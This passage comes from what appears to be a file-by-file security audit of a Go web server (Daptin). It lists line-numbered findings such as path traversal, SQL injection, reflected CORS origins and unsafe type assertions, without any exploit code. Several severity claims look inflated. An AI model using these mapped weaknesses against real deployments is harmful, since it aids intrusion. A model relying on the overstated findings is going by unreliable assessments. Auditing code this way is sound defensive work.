- **Lines 361, 369, 377, 393, 401, 409:** Error information disclosure exposes system internals through detailed error messages
- **Lines 189-194:** Network connection information exposure reveals internal network topology when permissions allow

### Low Issues
- **Lines 132-151:** Commented out disk partition information suggests previous exposure considerations
- **Lines 302-304:** Fixed process limit without configuration reduces monitoring flexibility
- **Lines 346-414:** Missing input validation for statistics requests enables potential parameter manipulation

### Critical Information Disclosure
- **System reconnaissance:** Complete system information available for attack planning
- **Process targeting:** Running processes and command lines exposed for vulnerability analysis
- **User enumeration:** Connected users identified for lateral movement attacks

---

## server/streams_test.go

### Medium Issues
- **Line 28:** Hardcoded database credentials in test environment - predictable "daptin_test.db" filename with no authentication
- **Lines 28-31:** Resource leak potential - database connection not properly closed in test environment
- **Lines 29-31:** Panic on database connection failure prevents graceful test failure and makes debugging difficult
- **Lines 66-67:** SQL injection potential in test query parameters demonstrates unsafe query construction patterns

### Low Issues
- **Lines 94-97:** Incomplete error handling in test - errors logged but test doesn't fail, masking functional issues
- **Lines 35-46:** Empty middleware configuration doesn't validate security middleware functionality
- **Lines 94-98:** Missing test assertions prevent validation of expected outcomes and query parameter processing
- **Lines 88-91:** Fixed test data without validation of edge cases or boundary conditions

### Test Environment Security
- **Resource management:** Database connections not properly cleaned up in test scenarios
- **Query patterns:** Test demonstrates potentially unsafe query construction that should be validated in production
- **Configuration security:** Hardcoded test configurations reduce security and flexibility

---

## server/sub_path_fs.go

### High Issues
- **Line 16:** Path traversal vulnerability through direct string concatenation - `spf.system.Open(spf.subPath + name)` allows "../" directory traversal attacks
- **Lines 5-6, 14-16:** Missing input validation for constructor parameters and file names enables unauthorized file system access

### Medium Issues
- **Line 16:** Insecure path construction using string concatenation instead of proper path joining causes cross-platform compatibility issues
- **Line 16:** No error context or logging prevents security monitoring and may leak file system information

### Low Issues
- **Line 15:** Commented debug code could expose file paths if uncommented accidentally
- **Lines 5-6:** No interface validation allows nil FileSystem parameters causing runtime panics
- **Entire file:** Missing documentation fails to warn about path traversal risks and security implications

### Critical Path Traversal Risk
- **Directory traversal:** Complete lack of path validation enables access to files outside intended sub-path
- **System file access:** Attackers can access sensitive files like /etc/passwd through "../" sequences
- **Cross-platform vulnerability:** String concatenation fails to handle path separators securely

---

## server/subsite_cache.go

### High Issues
- **Lines 84-157:** Missing input validation in binary deserialization allows malformed data to cause excessive memory allocation and DoS
- **Lines 24, 250-268:** Unsafe file path storage in cache exposes file paths across distributed nodes enabling path traversal attacks
- **Lines 90, 94, 101, 105, etc.:** Information disclosure through detailed error messages exposes internal system information

### Medium Issues
- **Lines 286-311:** Race condition in cache initialization between check and initialization could cause inconsistent states
- **Lines 185-192:** Unbounded memory growth in metrics counters could lead to integer overflow in long-running services
- **Lines 244-247:** Weak cache key generation using simple string concatenation enables cache pollution and key collisions
- **Lines 250-268:** File system race condition (TOCTOU) between stat check and content delivery causes cache inconsistency

### Low Issues
- **Lines 176-182:** Global variable usage creates thread safety concerns and testing difficulties
- **Lines 169-172:** Magic numbers in configuration reduce deployment flexibility
- **Lines 448-464:** Potential goroutine leak in metrics logging without cancellation mechanism

### Critical Distributed Cache Security
- **Memory exhaustion:** Malformed binary data can trigger excessive allocations across cache nodes
- **Path manipulation:** File paths in distributed cache can be exploited for unauthorized file access
- **Information leakage:** Error messages expose internal system topology and file structures

---

## server/subsite_engine.go

### Medium Issues
- **Lines 32-34, 42-44:** Missing authentication for statistics endpoints exposes subsite performance data without authorization
- **Lines 21, 43:** Global statistics variable access enables unauthorized access to system-wide performance data
- **Line 36:** Information disclosure through debug logging exposes file system paths and subsite configurations

### Low Issues
- **Lines 33, 43:** Hardcoded HTTP status codes mixed with constants creates inconsistent code patterns
- **Lines 32-34, 42-44:** Duplicate statistics endpoints with unclear API design and different data sources
- **Line 39:** Commented code without context may indicate security or design concerns
- **Lines 12, 28-30:** Missing input validation for function parameters could cause runtime panics

### Subsite Information Exposure
- **Performance monitoring:** Statistics endpoints reveal traffic patterns and system behavior
- **File system disclosure:** Trace logging exposes local file paths and directory structures
- **Configuration exposure:** Subsite names and sources available through unprotected endpoints

---

## server/subsite_handler.go

### High Issues
- **Lines 48-51, 63, 137, 207, 213:** Path traversal vulnerability through user-controlled path parameter in file operations without validation
- **Lines 80, 109, 259:** Unsafe type assertions without validation can panic causing denial of service
- **Lines 44, 54, 106, 122, 153, 194, 208, 253, 258:** Host header injection in cache keys enables cache poisoning attacks

### Medium Issues
- **Lines 270-274:** Information disclosure through hardcoded fallback content reveals application structure and SPA architecture
- **Lines 78-87, 108-117:** Cache timing side channel reveals file existence and system structure through response timing
- **Lines 95, 153:** Missing rate limiting for cache operations enables memory exhaustion through cache flooding
- **Lines 130-137, 199-203:** File system race conditions (TOCTOU) between stat and read operations cause content integrity issues

### Low Issues
- **Lines 37-38:** Hardcoded cache TTL values reduce operational flexibility for different deployment scenarios
- **Lines 31-32:** Global cache variables create state management and testing difficulties
- **Line 244:** Missing input validation for file extensions may cause content type confusion

### Critical Subsite Security
- **Directory traversal:** No path validation enables access to files outside intended directories
- **Cache manipulation:** Host header injection allows cache poisoning and request routing attacks
- **Service disruption:** Type assertion panics can crash entire subsite handling

---

## server/subsites.go

### High Issues
- **Line 118:** Environment variable injection for temporary directory - DAPTIN_CACHE_FOLDER manipulation enables unauthorized directory creation
- **Lines 116-118:** Predictable temporary directory creation with ignored UUID generation errors and no cleanup mechanism
- **Lines 80-81, 83-84:** Rate limiting key vulnerability through Host header injection enables rate limit bypass
- **Lines 135-144:** Unsafe task scheduling with user-controlled data enables privilege escalation with admin privileges

### Medium Issues
- **Lines 54, 58, 112, 126:** Information disclosure through detailed error logging exposes internal system state and site configurations
- **Lines 62-63:** Admin email ID exposure in logs reveals administrator credentials for targeted attacks
- **Lines 116, 146, 156:** Missing error handling for critical operations including UUID generation and task scheduling

### Low Issues
- **Lines 86, 89:** Hardcoded rate limit values reduce operational flexibility and may be too permissive
- **Lines 51, 76-77, 130-133, 179:** Commented code without context may contain sensitive information or security implications
- **Lines 118-122:** Resource cleanup missing for temporary directories causes resource leaks in error scenarios

### Critical Subsites Security
- **Environment manipulation:** Environment variables can be exploited to create directories outside intended locations
- **Task privilege escalation:** User-controlled site data used in admin-privileged task scheduling
- **Information leakage:** Admin credentials and detailed system state exposed through logging

---

## server/utils.go

### High Issues
- **Lines 76-77, 85-86:** Weak cryptographic key generation using UUID instead of cryptographically secure random for JWT and encryption secrets
- **Lines 104-106:** Panic on critical resource creation failure causes uncontrolled application termination and denial of service
- **Lines 343-344:** Environment variable path injection through DAPTIN_SCHEMA_FOLDER enables unauthorized file deletion
- **Line 61:** Unsafe type assertion in error handling can panic and mask original errors

### Medium Issues
- **Lines 132-152:** SQL injection potential through complex dynamic query construction with pattern matching operations
- **Line 195:** JSON unmarshaling without validation of database content could cause injection or DoS
- **Lines 335, 339, 344, 347:** File operations without path validation could delete files outside intended scope

### Low Issues
- **Lines 97, 159, 172, 189, 203, 209, 225:** Information disclosure through detailed logging exposes internal system state
- **Lines 27-55:** Missing input validation in utility functions could cause runtime errors with unexpected inputs
- **Line 25:** Global JSON configuration could inadvertently affect security-relevant parsing behavior

### Critical System Security
- **Authentication compromise:** Weak JWT secret generation enables token forgery across entire system
- **Encryption vulnerability:** Weak encryption keys compromise all encrypted data
- **File system manipulation:** Environment variables can be exploited for unauthorized file operations

---

## server/yjs_doucment_provider.go

### High Issues
- **Lines 45-48:** Path injection through user-controlled document path used without validation enables unauthorized database access
- **Lines 68, 76:** Unsafe type assertions without validation can panic causing denial of service
- **Line 59:** UUID parsing without error handling using uuid.MustParse causes panic on invalid input
- **Line 36:** Insecure directory permissions (0777) allow world-writable access to collaborative documents

### Medium Issues
- **Lines 51-55:** Transaction resource leak on error conditions could exhaust database connections
- **Lines 44, 50, 62, 80:** Information disclosure through logging exposes document paths and internal operations
- **Lines 29-32:** Missing input validation for configuration enables directory creation in unauthorized locations

### Low Issues
- **Lines 31, 36, 42:** Hardcoded configuration values reduce operational flexibility for different deployments
- **Lines 30, 76:** Silent error handling ignores configuration and base64 decoding errors causing unexpected behavior
- **Lines 46-48:** Missing bounds checking for array access could panic on malformed document paths

### Critical Collaborative Editing Security
- **Document exposure:** World-writable directories expose collaborative documents to unauthorized system users
- **Access control bypass:** Path injection enables access to unauthorized documents and database records
- **Service disruption:** Multiple panic conditions can crash collaborative editing functionality

---

## server/endpoint_yjs.go

### Critical Issues
- **Line 70:** Unsafe type assertion `user := sessionUser.(*auth.SessionUser)` can panic and enable authentication bypass
- **Lines 74-82, 88-90:** Transaction resource leaks - multiple transactions begun without proper cleanup, early returns bypass rollback
- **Lines 80-98:** Permission race condition (TOCTOU) - object fetched in one transaction, permissions checked in another enables authorization bypass
- **Line 81:** UUID parsing panic `uuid.MustParse(referenceId)` with user-controlled input causes DoS
- **Lines 50-61:** Redis PubSub resource leak - goroutine runs indefinitely without cancellation mechanism

### Security Issues
- **Lines 46, 72:** Missing input validation for typename, column names, and referenceId parameters enables injection
- **Line 101:** Predictable room names `fmt.Sprintf("%v%v%v%v%v", typename, ".", referenceId, ".", columnInfo.ColumnName)` enable unauthorized access
- **Line 58:** Error information disclosure through detailed error messages with internal system details
- **Line 102:** Context value type safety issues - interface{} values can cause downstream panics

### Resource Management Issues
- **Goroutine leak:** Unlimited Redis subscription goroutines without proper lifecycle management
- **Transaction leaks:** Multiple database connections exhausted through improper transaction cleanup
- **Memory exhaustion:** No limits on collaborative editing sessions or room subscriptions

---

## server/event_message_handler.go

### Critical Issues
- **Line 26:** Multiple vulnerabilities in single line - unsafe type assertion `eventDataMap["reference_id"].(string)` and panic-prone `uuid.MustParse()` with user-controlled input
- **Line 24:** JSON injection through Redis messages - `json.Unmarshal(eventMessage.EventData, &eventDataMap)` deserializes untrusted data without validation
- **Line 55:** Unsafe type assertion `file["contents"].(string)` can panic with malformed data from database
- **Line 55:** Base64 injection and memory exhaustion - no size limits on decoded content, error discarded
- **Lines 28-33:** Transaction resource leak - improper cleanup with potential early returns

### Security Issues  
- **Lines 15, 22:** Missing input validation for typename parameter and Redis message content enables logic bypass
- **Line 58:** Predictable document names `fmt.Sprintf("%v.%v.%v", typename, referenceId, columnInfo.ColumnName)` enable enumeration attacks
- **Lines 19, 25, 31:** Error information disclosure through detailed error messages with internal system details
- **Lines 20, 32, 47:** Missing error propagation - critical errors silently ignored by returning nil

### Resource Management Issues
- **Memory exhaustion:** No limits on base64 decoded content size can exhaust server memory
- **Transaction leaks:** Database connections held inappropriately long with improper cleanup
- **Silent failures:** Processing appears successful when critical errors occurred leading to data inconsistency

---

## server/feed_handler.go

### Critical Issues
- **Lines 31, 58, 62, 74, 80, 103, 105-108, 117, 119-122:** Multiple unsafe type assertions throughout feed processing can panic application with malformed database data
- **Lines 105-124:** XML/JSON injection through database content - feed content includes unsanitized user data enabling XSS and parser attacks
- **Lines 24, 26, 99, 146:** Information disclosure through error messages exposing database details and internal system information
- **Lines 42-50:** Parameter injection in feed names - no validation enables path manipulation and potential query injection

### Security Issues
- **Lines 41-151:** Missing access control - no authentication or authorization for feed access enables unauthorized information disclosure
- **Lines 34-38:** Stream ID type confusion with `fmt.Sprintf("%v", stream["id"])` on arbitrary interface{} types
- **Line 15:** Transaction resource management issues - long-running transactions passed to handler creation

### Resource Management Issues
- **Type assertion panics:** Extensive unsafe type assertions create multiple crash points
- **Transaction misuse:** Improper transaction lifecycle management can cause resource exhaustion
- **No rate limiting:** Feed generation endpoints lack abuse protection

---

## server/file_serving_utils.go

### High Issues
- **Lines 90, 161, 164:** Path traversal vulnerability - functions accept `fullPath` parameter without validation enabling directory traversal attacks
- **Lines 85-86, 135-139:** HTTP header injection via file names - file extensions used directly for MIME type detection without validation
- **Lines 96-97, 101-109:** Memory exhaustion via buffer pool - `io.ReadAll` can allocate large memory, size check after allocation

### Security Issues
- **Lines 37-38, 52:** Weak ETag generation - predictable values `fmt.Sprintf("%x-%x", info.ModTime().Unix(), info.Size())` enable cache manipulation
- **Lines 62-68:** Time-based information disclosure - precise file modification times revealed enable system fingerprinting
- **Line 137:** Content type detection on user data - `http.DetectContentType(data)` enables MIME sniffing vulnerabilities

### Resource Management Issues
- **Lines 164-170:** Resource leak in error conditions - file handles may leak if deferred close fails
- **Memory allocation:** Large file reads can exhaust server memory through buffer pool misuse
- **Hard-coded limits:** Inflexible configuration may not suit all deployment environments

---

## server/ftp_server.go

### Critical Issues
- **Lines 216, 246, 258, 291, 324, 343, 358, 366, 374-377:** Path traversal vulnerability - path construction uses user-controlled input without validation enabling directory traversal attacks
- **Line 187:** Unsafe type assertion `userAccount["password"].(string)` can panic during authentication causing DoS and potential bypass
- **Lines 183-189:** Information disclosure in authentication - different error paths enable user enumeration through timing attacks
- **Lines 269, 337:** Insecure file permissions - fixed permissions `0750` and `0600` may not match security requirements
- **Lines 453-469:** External HTTP request without validation - unencrypted request to `http://checkip.amazonaws.com` creates SSRF risk

### Security Issues
- **Lines 134-148, 175-182:** Transaction resource management - improper transaction handling can cause database connection leaks
- **Lines 153-158, 200:** Race condition in connection limiting - check-then-act pattern allows connection limit bypass
- **Lines 205-217, 231-249:** Missing input validation - no validation of path format before splitting creates array bounds violations
- **Lines 294-297:** Error logic inversion - `if err == nil` should be `if err != nil` causing silent failures

### Resource Management Issues
- **Path injection:** Malicious FTP commands can crash server through array bounds violations
- **Connection limits:** Race conditions allow exceeding maximum client connections
- **Debug information:** Sensitive information exposed through debug logs and error messages

---

## server/graphql.go

### Critical Issues
- **Lines 56, 328, 330-332, 360, 364, 471, 491, 494, 499, 502, 507, 510, 515, 518, 522, 525, 529, 532, 658, 667, 766:** Multiple unsafe type assertions throughout GraphQL resolvers can panic with malformed queries
- **Lines 658, 766:** UUID parsing panic `uuid.MustParse()` with user-controlled GraphQL parameters causes DoS
- **Lines 491-533:** SQL injection through aggregation parameters - GraphQL input passed directly to SQL with copy-paste bugs in field assignments
- **Lines 604-637, 649-735:** Authorization bypass in mutations - create operations lack permission checks, inconsistent validation

### Security Issues
- **Lines 386, 466, 476, 631, 685, 728, 769:** Information disclosure through error messages exposing database details and internal structure
- **Lines 474-484, 623-627, 670-680, 760-764, 839-848:** Transaction resource management issues - inconsistent cleanup and potential connection leaks
- **Lines 502, 510:** Aggregation logic bugs - filter and having clauses incorrectly assigned to GroupBy array
- **Lines 323-337, 354-367:** Missing input validation for GraphQL parameters enables manipulation

### Resource Management Issues
- **Type assertion panics:** Extensive unsafe assertions create multiple crash points for DoS attacks
- **Transaction leaks:** Inconsistent transaction management can exhaust database connections
- **Resource limits:** No pagination limits or query complexity controls enable resource exhaustion

---

## server/handlers.go

### Critical Issues
- **Lines 23, 131:** Unsafe type assertion for authentication `user.(*auth.SessionUser)` can panic and enable authentication bypass
- **Lines 59, 145:** UUID parsing panic `uuid.MustParse()` with user-controlled input from URL parameters and request body
- **Lines 44, 52, 107, 144, 165, 186:** Multiple unsafe type assertions on database results and user input can crash server
- **Line 142:** JSON injection through request body - `json.Unmarshal(requestBodyBytes, &requestBodyMap)` without validation
- **Lines 104-109:** SQL injection through state update - unvalidated `nextState` and `typename` values in SQL construction

### Security Issues
- **Lines 62-68, 167-173:** Transaction resource management - defer commit without error checking causes potential connection leaks
- **Line 193:** Hard-coded permission values - fixed permission bits may be overly permissive for state machines
- **Lines 34-35, 60, 146:** Missing input validation for URL parameters enables parameter injection and logic bypass
- **Lines 39, 64, 101, 136, 169, 201:** Error information disclosure through detailed error messages exposing system internals

### Resource Management Issues
- **Authentication crashes:** Type assertion failures in critical authentication path enable DoS and bypass
- **Transaction leaks:** Improper transaction cleanup can exhaust database connections
- **State manipulation:** SQL injection through state machine parameters can corrupt state data

---

## server/image.go

### Critical Issues
- **Lines 19-355:** Resource exhaustion through image processing - no limits on image size, processing time, or memory usage enables DoS attacks
- **Lines 325-337:** Memory exhaustion via large images - uncontrolled memory allocation with `image.Decode()` and `image.NewNRGBA()` 
- **Lines 34-83:** Algorithmic complexity attacks - blur and edge detection operations with unvalidated radius parameters cause CPU exhaustion
- **Lines 29, 94-96, 106-108, 133-136, 156-157, 226-227, 255:** Missing input validation - numeric parameters processed without bounds checking

### Security Issues
- **Lines 21-22, 323-337:** Uncontrolled filter chain complexity - no limits on number of filters enables performance degradation attacks
- **Line 256:** Color parsing without validation - `ParseHexColor("#" + vals[1])` with ignored errors
- **Lines 339-351:** Format security issues - `formatName` from decoder used directly in Content-Type header enables injection
- **Line 287:** Logic error in rotation - `rotate90` parameter incorrectly applies 270-degree rotation

### Resource Management Issues
- **No resource limits:** Image processing lacks CPU, memory, and time constraints enabling resource exhaustion
- **Filter stacking:** Unlimited filter combinations can multiply processing impact exponentially  
- **Memory bombs:** Large image processing can consume gigabytes without validation

---

## server/inmemory_mock_db.go

### Security Issues
- **Lines 33, 54, 84, 102, 112, 120, 130, 139, 147, 157, 167, 182, 192:** Information disclosure through query logging - all SQL queries logged without sanitization may expose sensitive test data
- **Lines 1-2:** Build tag limitation - only excluded from production builds but could be included in development environments
- **Lines 71, 80-84, 98-102:** Memory leak in query storage - unbounded accumulation of queries without cleanup in long-running tests
- **Lines 134-141, 172-175, 196-198:** Inconsistent query tracking - some operations tracked incorrectly while others missing

### Resource Management Issues
- **Memory growth:** Query history grows without limits potentially exhausting memory in long tests
- **Test reliability:** Inconsistent tracking behavior may lead to false test results
- **State management:** Inconsistent instance creation in Exec method affects test consistency

---

## server/jsmodel_handler.go

### Critical Issues
- **Lines 60, 173, 247:** Unsafe type assertion for authentication `user.(*auth.SessionUser)` and database fields can panic and enable authentication bypass
- **Lines 94-105:** SQL injection through aggregation parameters - user-controlled query parameters passed directly to SQL without validation
- **Lines 64, 71, 88, 110, 167, 209, 217, 243:** Information disclosure through error messages exposing database details and internal system information

### Security Issues
- **Lines 69-75, 207-213:** Transaction resource management - inconsistent cleanup patterns cause potential connection leaks
- **Lines 175, 180-182, 331-332:** Cache memory exhaustion - unbounded sync.Map cache without size limits or expiration
- **Lines 124, 137, 139-143:** ETag weak validation - substring matching enables cache manipulation attacks
- **Lines 55, 132, 179:** Missing input validation for URL parameters enables parameter injection

### Resource Management Issues
- **Authentication crashes:** Type assertion failures in authentication code enable DoS and bypass
- **Memory exhaustion:** Unbounded cache growth can consume all available memory
- **Transaction leaks:** Improper database transaction cleanup can exhaust connections

---

## server/language.go

### Security Issues
- **Lines 35, 43-47, 49:** Missing input validation for Accept-Language header - no size or format validation enables resource exhaustion through malformed headers
- **Lines 23, 50:** Error information disclosure - configuration errors and user-controlled header values logged exposing system internals
- **Lines 51-52, 58-68:** Memory allocation on every request with unbounded language preference lists enables memory exhaustion
- **Line 17:** Transaction management in constructor - unclear transaction ownership may lead to resource leaks

### Resource Management Issues
- **Memory pressure:** New allocations on every request without reuse contribute to garbage collection pressure
- **Unbounded processing:** No limits on language preference list size enables memory exhaustion attacks
- **Transaction lifecycle:** Unclear responsibility for transaction cleanup may cause connection leaks

---

## server/mail_adapter.go

### Critical Issues
- **Lines 118, 398, 399, 409, 413, 468, 469:** Multiple unsafe type assertions throughout mail processing can crash mail server and enable authentication bypass
- **Lines 291-310:** Private key exposure and weak error handling - PEM decode errors ignored, cryptographic failures not properly handled
- **Lines 322-344:** Mail content injection and DKIM bypass - headers included without validation enabling email forgery attacks
- **Lines 447-475:** SQL injection through mail content - mail fields stored in database without sanitization

### Security Issues  
- **Lines 104, 234, 260, 267, 272, 286, 293, 352, 376, 388, 476:** Information disclosure through error messages exposing database details and system architecture
- **Lines 96-123:** Weak authentication implementation - timing attacks possible, no rate limiting or brute force protection
- **Lines 102-108, 258-264, 284-290, 386-392:** Transaction resource management - inconsistent cleanup patterns cause connection exhaustion
- **Lines 270-354:** Mail forwarding without proper validation - insufficient sender validation enables mail relay abuse

### Resource Management Issues
- **Authentication crashes:** Type assertion failures in SMTP authentication enable DoS and bypass
- **Transaction leaks:** Multiple transaction patterns without consistent cleanup exhaust database connections  
- **Memory exhaustion:** Large emails loaded entirely into memory without size limits

---

## server/merge_tables.go

### Security Issues
- **Lines 8, 13-14, 22-27:** Missing input validation - no validation of table names or configuration data enables unexpected behavior with malformed input
- **Lines 9-10, 12-15, 65, 101, 108:** Potential memory issues with large configurations - unbounded memory allocation without limits
- **Line 31:** Information disclosure through logging - table names logged without sanitization may reveal database schema

### Resource Management Issues
- **Memory scaling:** Memory usage scales linearly with configuration size without bounds checking
- **Algorithm efficiency:** O(n²) complexity for table and column matching may cause performance issues
- **Information exposure:** Debug logging may reveal sensitive database structure information

---

## server/config_handler.go

### Critical Issues
- **Line 18:** Unsafe type assertion `sessionUser = user.(*auth.SessionUser)` can panic if context contains wrong type
- **Lines 38, 43, 54, 55, 75, 76, 96, 97:** Missing input validation for configuration keys and values enables injection attacks
- **Lines 34, 41, 44, 49:** Information disclosure - configuration data exposed without sanitization including sensitive values
- **Lines 22-29:** Transaction resource management - potential resource leaks from improper transaction cleanup

### Security Issues
- **Lines 69, 90, 105:** Error information disclosure - internal error details exposed to clients
- **All endpoints:** Missing rate limiting allows configuration endpoint abuse and DoS attacks
- **All modification endpoints:** Missing CSRF protection for state-changing operations
- **No audit logging:** Configuration changes not logged for security monitoring

### Data Security Issues
- **Lines 41, 49:** Sensitive configuration values exposed without redaction (passwords, API keys, secrets)
- **No input size limits:** Large configuration values can cause memory exhaustion DoS
- **No configuration key restrictions:** Allows injection of malicious configuration keys

---

## server/config.go

### Critical Issues
- **Lines 47-60, 140-143:** Path traversal vulnerability - environment-controlled DAPTIN_SCHEMA_FOLDER enables directory traversal attacks
- **Lines 74-78, 87-107:** Unsafe file loading - configuration files loaded without size limits or security validation
- **Line 47:** Environment variable injection - DAPTIN_SCHEMA_FOLDER used directly in file operations without validation
- **Lines 56-59, 140-143:** Unsafe string operations - path manipulation without bounds checking can cause panics

### Security Issues  
- **Lines 88, 94, 115, 155, 165, 176:** Error information disclosure - detailed file paths and system errors exposed in logs
- **Lines 122-130, 160-168:** Missing input validation - table/column names processed without SQL injection protection
- **Lines 74-78, 87-107:** Resource management issues - no limits on file operations and memory allocation

### Path Security Issues
- **Lines 59, 141:** Path injection through concatenation without validation
- **Lines 62-63:** Unsafe file globbing with user-controlled paths
- **No file type validation** beyond extension checking allows malicious file processing

---

## server/cors.go

### Critical Issues
- **Lines 71-73, 76, 79:** Overly permissive CORS configuration - allows any origin with credentials enabling complete CORS bypass
- **Line 71:** Unsafe origin reflection - Origin header directly reflected without validation enabling origin spoofing attacks
- **Lines 28, 34, 40, 46:** Unused security configuration - validation options defined but not implemented creating false security
- **Lines 71, 76:** Missing input validation - HTTP headers used without validation enabling header injection attacks

### CORS Security Issues
- **Lines 76, 79:** Inconsistent header handling - different logic for OPTIONS vs other methods enables security bypass
- **Complete CORS security model circumvention** through permissive configuration
- **CSRF attack enablement** via unrestricted cross-origin access with credentials
- **Data exfiltration vulnerability** through malicious cross-origin requests

### Authentication and Session Issues
- **Line 73:** Always allows credentials with any origin enabling session hijacking
- **No origin whitelist enforcement** allows any malicious site to access authenticated APIs
- **Same-origin policy bypass** through reflected origin headers

---

## server/database_connection.go

### Critical Issues
- **Lines 19-33, 35:** Connection string injection - unvalidated connection string manipulation enables SQL injection in connection parameters
- **Lines 41-59:** Environment variable injection - database configuration parameters used without validation enabling resource exhaustion
- **Lines 17, 35:** Missing input validation - dbType and connectionString parameters not validated enabling driver exploitation
- **Lines 62-79:** Error handling issues - parse errors handled silently masking potential attacks

### Security Issues
- **Lines 89-97:** Information disclosure - detailed database configuration logged without sanitization
- **Lines 49-51:** Resource management issues - hardcoded SQLite limits and potential misconfiguration
- **Lines 19-33:** String parsing vulnerabilities - simple string operations without proper URL parsing

### Database Security Issues
- **No connection string validation** allows injection of malicious parameters and credential manipulation
- **No environment bounds checking** enables DoS through extreme configuration values  
- **No database driver validation** allows exploitation of unsupported or malicious database types
- **No SSL/TLS enforcement** for database connections enables man-in-the-middle attacks

---

## server/endpoint_caldav.go

### Critical Issues
- **Lines 16, 27-51:** Path traversal vulnerability - local file system access without path validation enables directory traversal attacks
- **Lines 19-25:** Insufficient access control - basic authentication with potentially weak authorization checks
- **Lines 30-38, 43-51:** Unrestricted file operations - full WebDAV operations without fine-grained access control
- **Lines 16, 27-51:** Missing input validation - no validation of file paths, names, or WebDAV content

### WebDAV Security Issues
- **Lines 33-38, 46-51:** Protocol method exposure - advanced WebDAV methods (PROPFIND, PROPPATCH, MKCOL) without security considerations
- **Line 16:** Storage backend security - unencrypted local storage without access controls
- **Line 21:** Missing security headers for defense in depth
- **No file type restrictions** allows upload of any file types including malicious content

### File System Security Issues
- **Directory traversal through wildcard paths** enables access to files outside storage directory
- **No file size limits** allows storage exhaustion attacks
- **No rate limiting** enables DoS through excessive WebDAV requests
- **No audit logging** for WebDAV operations prevents security monitoring

---

## server/endpoint_favicon.go

### Security Issues
- **Lines 11-12:** Missing input validation - format parameter validation limited to basic string comparison
- **Lines 27, 31, 38:** Path traversal risk - file paths constructed without comprehensive validation
- **Lines 22, 47, 59, 72:** Resource management issues - file handles not explicitly closed causing potential leaks
- **Line 73:** Error information disclosure - detailed error information logged without sanitization

### File Handling Issues
- **Lines 28, 39, 69:** Content type validation - content types hardcoded without validation against actual file content
- **Lines 18-19:** Cache header security - aggressive 1-year caching without security considerations for updates
- **No rate limiting** for favicon requests enables potential DoS through repeated requests
- **No file content validation** beyond size limits allows serving of malicious content

---

## server/endpoint_ftp_init.go

### Critical Issues
- **Line 15:** Insecure default configuration - FTP server binds to all interfaces (0.0.0.0:2121) by default
- **Lines 13, 15, 21:** Missing input validation - FTP interface configuration not validated enabling network binding abuse
- **Lines 23-27:** Goroutine resource management - FTP server started without proper lifecycle management
- **Lines 22, 26:** Insufficient error handling - critical errors handled with logging but execution continues

### Network Security Issues
- **Line 15:** Network exposure to all interfaces enables unauthorized external access
- **Line 21:** Configuration injection through malicious interface values
- **Line 24:** Information disclosure - FTP interface logged without sanitization
- **No network security considerations** for FTP protocol (unencrypted by default)

### Configuration Security Issues
- **Lines 16-17:** Configuration security - values stored without validation or access control
- **No port validation** allows binding to privileged or reserved ports
- **No interface validation** enables binding abuse and service conflicts
- **Silent failure modes** from unhandled goroutine errors

---

## server/endpoint_ftp.go

### Critical Issues
- **Lines 15, 52:** Missing input validation - FTP interface parameter and site data used without comprehensive validation
- **Lines 28-29:** Unsafe type conversion - UUID conversion from bytes without error handling can cause panics
- **Lines 17, 21:** Database injection risk - database queries through interfaces without visible validation
- **Lines 40-43, 52:** Resource access control - asset cache and site resources accessed without authorization checks

### Data Security Issues
- **Line 54:** Error information disclosure - detailed error information exposed through logging without sanitization
- **Lines 26-30, 33-48:** Memory and resource management - large data structures created without size limits
- **Lines 28, 41:** Silent error handling - errors silently ignored in non-critical operations masking issues
- **No site validation** allows processing of malformed or malicious site configurations

### FTP Security Issues
- **No authorization checks** for site and resource access enables cross-site data access
- **No resource limits** allows resource exhaustion through excessive site enumeration
- **No audit logging** for FTP operations prevents security monitoring
- **Unsafe UUID handling** enables potential memory corruption through malformed reference IDs

---

## server/endpoint_graphql.go

### Critical Issues
- **Lines 20-38:** Missing authentication and authorization - GraphQL endpoints exposed without any access controls
- **Lines 14-16:** Development features in production - GraphQL Playground and GraphiQL enabled without environment checks
- **Lines 20-38:** Unrestricted HTTP methods - all HTTP methods (GET, POST, PUT, PATCH, DELETE) supported without validation
- **Lines 10, 20-38:** Missing input validation - no validation of GraphQL queries, mutations, or input parameters

### GraphQL Security Issues
- **Lines 21, 25, 29, 33, 37:** Missing security headers for GraphQL responses
- **Line 14:** Error information disclosure - pretty printing enabled may expose sensitive error information
- **No rate limiting** for GraphQL endpoints enables query flooding and DoS attacks
- **No query complexity analysis** allows resource exhaustion through complex queries

### API Security Issues
- **Schema introspection always enabled** exposing complete database structure to attackers
- **No audit logging** for GraphQL operations prevents security monitoring
- **Development interfaces accessible** in production enabling unauthorized schema exploration
- **No query depth limiting** enables deep query attacks causing stack overflow

---

## server/endpoint_imap.go

### Critical Issues
- **Lines 12, 19, 25:** Missing input validation - IMAP configuration values used without validation for network binding and hostname
- **Lines 14, 16:** Insecure default configuration - default IMAP interface binds to all interfaces (:1143) without security consideration
- **Lines 36-46:** Goroutine resource management - IMAP server started without proper lifecycle management or error handling
- **Lines 30-32:** TLS configuration security - TLS configuration depends on external certificate manager without validation

### Network Security Issues
- **Line 16:** Network exposure to all interfaces by default enables unauthorized external access
- **Lines 19-20:** Hostname manipulation - hostname construction without validation enables subdomain injection
- **Line 37:** Port detection logic - TLS detection based on string suffix matching without proper port parsing
- **Line 34:** Information disclosure - IMAP server details logged without sanitization

### IMAP Protocol Security Issues
- **No authentication validation** for IMAP backend configuration
- **No rate limiting** for IMAP connections enables potential DoS attacks
- **No access controls** for IMAP server configuration
- **Silent failure modes** from unhandled goroutine errors potentially masking security issues

---

## server/endpoint_init.go

### Critical Issues
- **Lines 23-27, 38-46, 48-67:** Transaction resource management - multiple database transactions with inconsistent error handling and potential resource leaks
- **Lines 18, 32, 39, 43, 60, 62:** Error handling inconsistencies - inconsistent error handling with different error variables and patterns
- **Line 8:** Missing input validation - configuration and database connection parameters not validated before use
- **Lines 9-11, 17, 30, 35, 42, 54-62:** Database operation security - database operations without explicit authorization or validation

### Database Security Issues
- **Lines 12-13, 20-21, 55, 58, 68:** Commented code and dead paths - incomplete or experimental features indicating security gaps
- **Lines 18, 25, 32, 39, 43, 50, 60, 62:** Information disclosure - detailed error messages with transaction IDs and operation details
- **Lines 8-70:** Initialization race conditions - no protection against concurrent initialization attempts
- **No timeout protection** for long-running initialization operations

### System Integrity Issues
- **Database connection leaks** from unclosed transactions in error paths
- **Data inconsistency** from partial transaction commits and rollbacks
- **Service instability** from unhandled error conditions during initialization
